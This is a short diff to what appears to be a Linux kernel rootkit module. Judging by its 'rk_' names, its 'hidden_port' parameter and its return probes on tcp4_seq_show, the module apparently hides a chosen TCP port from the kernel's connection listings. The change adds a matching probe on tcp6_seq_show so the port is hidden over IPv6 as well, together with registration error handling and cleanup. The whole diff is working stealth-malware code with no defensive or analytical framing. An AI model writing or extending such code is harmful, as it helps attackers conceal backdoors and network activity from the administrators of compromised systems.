@@ -48,8 +48,16 @@ static int rk_tcp_show_return(struct kretprobe_instance *inst,
 	return 0;
 }
 
-static struct kretprobe tcp_probe = {
+static struct kretprobe tcp4_probe = {
 	.kp.symbol_name = "tcp4_seq_show",
+	.entry_handler = rk_tcp_show_entry,
+	.handler = rk_tcp_show_return,
+	.data_size = sizeof(struct rk_tcp_data),
+	.maxactive = 8,
+};
+
+static struct kretprobe tcp6_probe = {
+	.kp.symbol_name = "tcp6_seq_show",
 	.entry_handler = rk_tcp_show_entry,
 	.handler = rk_tcp_show_return,
 	.data_size = sizeof(struct rk_tcp_data),
@@ -58,14 +66,25 @@ static struct kretprobe tcp_probe = {
 
 static int __init rk_init(void)
 {
+	int error;
+
 	if (!hidden_port)
 		return -EINVAL;
-	return register_kretprobe(&tcp_probe);
+	error = register_kretprobe(&tcp4_probe);
+	if (error)
+		return error;
+	error = register_kretprobe(&tcp6_probe);
+	if (error) {
+		unregister_kretprobe(&tcp4_probe);
+		return error;
+	}
+	return 0;
 }
 
 static void __exit rk_exit(void)
 {
-	unregister_kretprobe(&tcp_probe);
+	unregister_kretprobe(&tcp6_probe);
+	unregister_kretprobe(&tcp4_probe);
 }
 
 module_init(rk_init);
